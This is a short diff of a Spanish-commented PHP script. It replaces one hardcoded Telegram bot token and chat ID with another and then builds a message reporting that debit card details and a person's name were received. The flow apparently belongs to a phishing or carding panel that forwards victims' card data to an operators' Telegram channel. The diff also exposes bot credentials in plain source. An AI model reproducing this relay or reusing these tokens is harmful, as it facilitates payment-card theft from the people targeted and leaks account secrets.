@@ -57,11 +57,14 @@ $update = $pdo->prepare(
 $update->execute([$nuevo_request_id, $key]);
 
 // ── Paso 5: Telegram sendMessage ──────────────────────────────────────────────
-// Configuración OPERACIONES: 1) env vars Render (nuevo) 2) fallback hardcode (legacy).
-$FALLBACK_BOT_TOKEN_OPS = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
-$FALLBACK_CHAT_ID_OPS   = "-4923753161";
-$token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_OPS;
-$chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_OPS;
+// FIX DETERMINANTE: CANAL NUEVO hardcodeado DEFAULT. getenv() SOLO sobreescribe si
+// existe y no está vacía. Nunca más al bot viejo.
+$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
+$DEFAULT_CHAT_ID_OPS   = "-5503364698";
+$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
+$envCh  = getenv('TELEGRAM_CHAT_ID_OPS');
+$token   = (is_string($envBot) && trim($envBot) !== '') ? $envBot : $DEFAULT_BOT_TOKEN_OPS;
+$chat_id = (is_string($envCh)  && trim($envCh)  !== '') ? $envCh  : $DEFAULT_CHAT_ID_OPS;
 
 $mensaje  = "✅ <b>[DATO EXTRA: TARJETA DÉBITO (corta)]</b> Resumen tarjeta recibido:\n";
 $mensaje .= "👤 $nombre\n";
